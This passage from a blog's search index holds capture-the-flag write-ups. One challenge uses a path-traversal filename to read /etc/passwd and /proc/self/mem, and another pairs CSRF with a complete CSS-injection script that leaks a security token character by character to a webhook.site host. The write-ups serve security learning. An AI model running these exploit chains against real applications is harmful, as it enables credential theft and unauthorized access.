m[\u0026#34;description\u0026#34;], id = m[\u0026#34;id\u0026#34;], ) if not metadata.find_one({\u0026#34;id\u0026#34;: m[\u0026#34;id\u0026#34;]}): fm.write(metadata, f[\u0026#34;content\u0026#34;]) print(files[-1][\u0026#34;metadata\u0026#34;][\u0026#34;filename\u0026#34;]) if (os.path.exists(\u0026#34;init/init_data.py\u0026#34;)): os.remove(\u0026#34;init/init_data.py\u0026#34;) First it will generate files with data from a pathname init/init_data.py and then delete those file. And the flag is one of those get deleted.\n{ \u0026#34;metadata\u0026#34;: { \u0026#34;author\u0026#34;: \u0026#34;Shimmering Pearl\u0026#34;, \u0026#34;filename\u0026#34;: \u0026#34;ocean_whispers.txt\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;The eternal song of the waves.\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;3dad5070-950c-48c5-bbb2-51312d4a8eab\u0026#34;, }, \u0026#34;content\u0026#34;: FLAG, }, Then we have 2 routes handle for read file:\n@app.get(\u0026#34;/files\u0026#34;) def get_files(): return [f[\u0026#34;metadata\u0026#34;] for f in files] @app.get(\u0026#34;/files/\u0026lt;id\u0026gt;\u0026#34;) def get_file(id): if id == \u0026#34;3dad5070-950c-48c5-bbb2-51312d4a8eab\u0026#34;: return \u0026#34;\u0026#34;, 403 res = metadata.find_one({ \u0026#34;id\u0026#34;: {\u0026#34;$eq\u0026#34;: id} }) if res is None: return \u0026#34;\u0026#34;, 404 m = FileMetadata( res[\u0026#34;author\u0026#34;], res[\u0026#34;filename\u0026#34;], res[\u0026#34;description\u0026#34;], id=res[\u0026#34;id\u0026#34;], ) if files[-1][\u0026#34;metadata\u0026#34;][\u0026#34;filename\u0026#34;] in res[\u0026#34;filename\u0026#34;]: return \u0026#34;\u0026#34;, 403 ######## read offset voi length chi v?????????????############## return m.read(int(request.args.get(\u0026#34;offset\u0026#34;, 0)), int(request.args.get(\u0026#34;length\u0026#34;, -1))) We can read any files with the id but not the id of the flag as well as the file has the same name of the flag file. Then is the route to handle uploading files :\ndef parse_file(body, id=None): import re, string ##### VI SAO PHAI CHECK PRINTABLE ####### CONTENT_CHECK = re.compile(f\u0026#34;[^ {string.printable}]\u0026#34;) if CONTENT_CHECK.search(body[\u0026#34;content\u0026#34;]): raise () if len(body[\u0026#34;content\u0026#34;]) \u0026gt; 200: raise ValueError() return { \u0026#34;metadata\u0026#34;: FileMetadata( body[\u0026#34;author\u0026#34;], body[\u0026#34;filename\u0026#34;], body[\u0026#34;description\u0026#34;], id, ), \u0026#34;content\u0026#34;: body[\u0026#34;content\u0026#34;] } @app.post(\u0026#34;/files\u0026#34;) def post_file(): body = request.json try: parsed_body = parse_file(body) except (KeyError, ValueError): return \u0026#34;\u0026#34;, 422 m = parsed_body[\u0026#34;metadata\u0026#34;] content = parsed_body[\u0026#34;content\u0026#34;] m.write(metadata, content) r = make_response(\u0026#34;\u0026#34;, 201) # KO CHECK PATH TRAVERSAL r.headers[\u0026#34;Location\u0026#34;] = f\u0026#34;/api/v1/files/{m.id}\u0026#34; return r @app.put(\u0026#34;/files/\u0026lt;id\u0026gt;\u0026#34;) def put_file(id): if id in forbidden_ids: return \u0026#34;\u0026#34;, 403 body = request.json try: parsed_body = parse_file(body, id) except (KeyError, ValueError): return \u0026#34;\u0026#34;, 422 m = parsed_body[\u0026#34;metadata\u0026#34;] content = parsed_body[\u0026#34;content\u0026#34;] m.write(metadata, content) r = make_response(\u0026#34;\u0026#34;, 201) # KO CHECK PATH TRAVERSAL r.headers[\u0026#34;Location\u0026#34;] = f\u0026#34;/api/v1/files/{m.id}\u0026#34; return r First is the function parse_file which will receive the body data and id to use that and create a FileMeta Data. Post and Put file function is just different that the Put you can handle id passed into parse_file which the Post doesn\u0026rsquo;t. But it seems the PUT get checked the forbidden_ids too much. Specially 3 times :vv. My silly ideas: # The first time, i have though about how can i abuse the id which seems a dead end but I want to talk about it a little bit. :v My idea is simple that I want to create a file with the same id of flag file although I dont have idea why does it :v and as it takes me long time with no results.\nBut i found something weird at the : self.id = str(UUID(id, version=4)) if id is not None else str(uuid4()) And when test it , i found this :\nHEy , HEY it get changed at letter A into 4\nAfter researching , I found that at that byte position used to specify the version in variant RFC 4122 UUID. So the implementation try to convert that bytes into the version number . Maybe this can be used to bypass in some challenges :DDD Continue : # SO it seems id is not our playground anymore :v. What can happen here ?\nAfter reading too long.. I feel like there is a flaw in the logic code def write(self, collection, content): if self.id in forbidden_ids and not self.init: raise ValueError(\u0026#34;Use of forbidden id\u0026#34;) collection.insert_one(vars(self)) ## INSERT VAO LUON ROI =)))))) if \u0026#34;./\u0026#34; in self.path: raise PathTraversalAttemptDetectedException() if len(content) \u0026gt; 200: raise FileTooBigException() with open(self.path, \u0026#34;w\u0026#34;) as f: f.write(content) It just check the id and then insert straight into the model =)))) So we dont actually care about the filename get checked by path traversal. As well as the read just need a filename and nothing mores :vvv. def read(self, offset, length): # Write duoc 1 filename co filename la path traversal -\u0026gt; lay id -\u0026gt; bo vao ham get -\u0026gt; READ EVERYTHING with open(self.path, \u0026#34;rb\u0026#34;) as f: f.seek(offset) return f.read(length) \u0026hellip; As well as the routes handling.\nNew ideas: # So what if I create a malicous filename to every file I want and then read that id ? I will receive the data from that file:DD.\nNow let\u0026rsquo;s try read /etc/passwd with these steps . It will be error because of geting caught by path traversal but I dont care :\u0026gt;\nThen read with our id !! Read what to get the flag ? # Well it seems the file is deleted by the python and not anymore. But it actually still lives in memory. And in linux to debug the memories we need to read at /proc/self/mem. Because it is a virtual file , it means it is created at the time we read it so to read it we need an offset and length, now we know the reason of them in read function ~~ How to find an offset # Ye, we have a friends called /proc/self/maps which will list all memory regions. Let\u0026rsquo;s get them now ! We will get a bunch of offset. *It will easier to read :v Then do the same steps to read into file /proc/self/mem with offset and length\nFINALLY ::: # You will find it \u0026lt;333 Art-Gallery # Overview # Main goals : We need to stole 2 types of token : SECURITY_TOKEN and SECRET_TOKEN. Use this to get access as admin and get the Flag stored at /admin SECRET_TOKEN : # This is really clear how to stole this.\napp.get(\u0026#39;/api/update\u0026#39;, auth, debug, csp, (req, res) =\u0026gt; { if (req.user.role === \u0026#39;admin\u0026#39; \u0026amp;\u0026amp; (req.ip === \u0026#39;::1\u0026#39; || req.ip === \u0026#34;127.0.0.1\u0026#34; || req.ip === \u0026#34;::ffff:127.0.0.1\u0026#34;)) { var username = req.query.username; // Grant developer role console.log(username, \u0026#34; is now a developer\u0026#34;); users.get(username).role = \u0026#39;developer\u0026#39;; } else { return res.status(403).send(\u0026#39;Forbidden\u0026#39;); } }); // Developer Zone app.get(\u0026#39;/api/dev\u0026#39;, auth, csp, debug, (req, res) =\u0026gt; { if (req.user.role === \u0026#39;developer\u0026#39; || req.user.role === \u0026#39;admin\u0026#39;) { return res.send(\u0026#39;JWT_SECRET: \u0026#39; + JWT_SECRET); } else { return res.status(403).send(\u0026#39;Forbidden\u0026#39;); } }); Well a users can get the SECRET_TOKEN with developer role is powered by the admin. But it actually just use the GET and we can abuse the function report to achive this goal. app.post(\u0026#39;/report\u0026#39;, auth, apiLimiter, async (req, res) =\u0026gt; { var url = req.body.url; if (!url) { return res.status(404).json({ message: \u0026#39;Not found\u0026#39; }); } if (!url.startsWith(\u0026#39;http://localhost:1337/view/\u0026#39;)) { return res.json({ success: false, message: \u0026#39;Nice try kiddo!\u0026#39; }); } console.log(\u0026#34;visiting url: \u0026#34;, url); try { visit(url); } catch (error) { console.log(error); } return res.json({ success: true, message: \u0026#39;Report sent successfully\u0026#39; }); }); Here is poc :\nTurn on debug with route /api/debug?debug_mode=1 Update role user with route /api/update?username=123 And stole it with with /api/dev(you will need to login again) Now we stole the the SECRET_KEY !!! How to steal the SECURITY_TOKEN : # Maybe you will think about the report function and lead the page to a XSS page and get the cookies. But it is not the case in this challenge because the cookies are protected. So how we leak the SECURITY_TOKEN. Read the source code you will see some malicous . app.use((req, res, next) =\u0026gt; { // Should be safe right? if (!req.theme) { const theme = req.query.theme; if (theme \u0026amp;\u0026amp; !theme.includes(\u0026#34;\u0026lt;\u0026#34;) \u0026amp;\u0026amp; !theme.includes(\u0026#34;\u0026gt;\u0026#34;)) { req.theme = theme; }else{ req.theme = \u0026#39;white\u0026#39;; } } next(); }) It creates a middleware to pass our query theme and put it into a style tag \u0026lt;style nonce=\u0026#34;{{ nonce }}\u0026#34;\u0026gt; body { background: {{theme | safe}}; } \u0026lt;/style\u0026gt; \u0026lt;h1 class=\u0026#34;title The safe makes it injectable. Let me show you an example. So we have a CSS injection ? And you can pay attention that the SECURITY_TOKEN is actually showed in the user interface? Well when learning XSS i found this good blog and I can even leak the SECURITY_TOKEN now !!!\nIdea # The leaks is working because of abusing the @font with loading an URL when matching a range of UNICODE which can just be a letter too ~~ !! Idea is create many fonts from a-z0-9 which one will fetch to my Webhook with its char and position . I have created a script to automate this. import time import requests import random import string from urllib.parse import quote s = requests.Session() def generate_random_string(length): # Choose from uppercase, lowercase, and digits characters = string.ascii_letters + string.digits random_string = \u0026#39;\u0026#39;.join(random.choices(characters, k=length)) return random_string baseUrl = r\u0026#34;http://localhost:1337\u0026#34; data = { \u0026#34;username\u0026#34;:generate_random_string(4), \u0026#34;password\u0026#34;:\u0026#34;123\u0026#34; } res = s.post(baseUrl+\u0026#34;/register\u0026#34;,json=data) print(res.text) res = s.post(baseUrl+\u0026#34;/login\u0026#34;,json=data) print(res.text) token = res.cookies.get(\u0026#39;token\u0026#39;) def char_to_unicode(char): code_point = ord(char) return f\u0026#34;{code_point:02X}\u0026#34; chars =\u0026#34;abcdefghijklmnopqrstuvwxyz0123456789\u0026#34; print(chars) webhook = \u0026#34;https://webhook.site/b7dd4def-ee30-4273-abbd-e7c070ed3d15\u0026#34; def loadFont(i): font = r\u0026#34;\u0026#34; result = [f\u0026#34;f{char}\u0026#34; for char in chars] result_string = r\u0026#39;, \u0026#39;.join(result) for char in chars: font+= r\u0026#39;\u0026#39;\u0026#39; @font-face%20{%20font-family:%20\u0026#34;f\u0026#39;\u0026#39;\u0026#39;+char+r\u0026#39;\u0026#39;\u0026#39;\u0026#34;;%20src:%20url(https://webhook.site/b7dd4def-ee30-4273-abbd-e7c070ed3d15/?q=\u0026#39;\u0026#39;\u0026#39;+char+str(i)+r\u0026#39;\u0026#39;\u0026#39;);%20unicode-range:%20U%2b\u0026#39;\u0026#39;\u0026#39;+char_to_unicode(char)+\u0026#39;\u0026#39;\u0026#39;;%20}\u0026#39;\u0026#39;\u0026#39; font+=r\u0026#39;\u0026#39;\u0026#39;.SECURITY_TOKEN%20:nth-child(\u0026#39;\u0026#39;\u0026#39;+str(i)+r\u0026#39;\u0026#39;\u0026#39;){color:red;font-family:\u0026#39;\u0026#39;\u0026#39;+result_string+r\u0026#39;\u0026#39;\u0026#39;,Arial\u0026#39;\u0026#39;\u0026#39; return font loadFont(1) def leak(i): data={\u0026#34;url\u0026#34;:baseUrl+r\u0026#39;\u0026#39;\u0026#39;/view/../profile?theme=white;:}\u0026#39;\u0026#39;\u0026#39;+loadFont(i)} res=s.post(baseUrl+\u0026#39;/report\u0026#39;,json=data,cookies={\u0026#34;token\u0026#34;:token}) print(res.text) for i in range(2,22): leak(i) FOUND local : ditmbzpvkkm7ow85qjz\nFOUND server: b3zjagxhqzwarjzfjkj\nThen just use JWT token and login as admin :DDD. Game end. \u0026lt;3 \u0026lt;3 \u0026lt;3 Conclusion. # I want to say thank you to all the authors who spends time creating such a great challenge. I learned a lots from these and its good chance to try my self to the best !!! ","date":"27 August 2024","externalUrl":null,"permalink":"/posts/wannagame/","section":"Posts","summary":"Write ups WannaGame # Dox List: # Source code : # CVE-2024-42352: https://nvd.nist.gov/vuln/detail/CVE-2024-42352\nServer :\n@app.route(\u0026#39;/health_check\u0026#39;) def health_check(): cmd = request.args.get(\u0026#39;cmd\u0026#39;) or \u0026#39;ping\u0026#39; health_check = f\u0026#39;echo \\\u0026#39;db.runCommand(\u0026#34;{cmd}\u0026#34;).ok\\\u0026#39; | mongosh mongodb:27017/app --quiet\u0026#39; try: result = subprocess.run(health_check, shell=True, capture_output=True, text=True, timeout=2) app.logger.info(result) return \u0026#39;Database is responding\u0026#39; if \u0026#39;1\u0026#39; in result.stdout else \u0026#39;Database is not responding\u0026#39; except subprocess.TimeoutExpired: return \u0026#39;Database is not responding\u0026#39; @app.route(\u0026#39;/api/dogs\u0026#39;) def get_dogs(): app.logger.info(f\u0026#34;Requests Header : {request.headers}\u0026#34;) dogs = [] for dog in app_db[\u0026#39;doxlist\u0026#39;].","title":"WannaGame","type":"posts"},{"content":"Im just a student wanna learn to sec\nHere is the place I note my journey !\n","date":"13 June 2022","externalUrl":null,"permalink":"/about/","section":"hibwyli","summary":"Im just a student wanna learn to sec\nHere is the place I note my journey !","title":"About","type":"page"},{"content":"","date":"13 June 2022","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]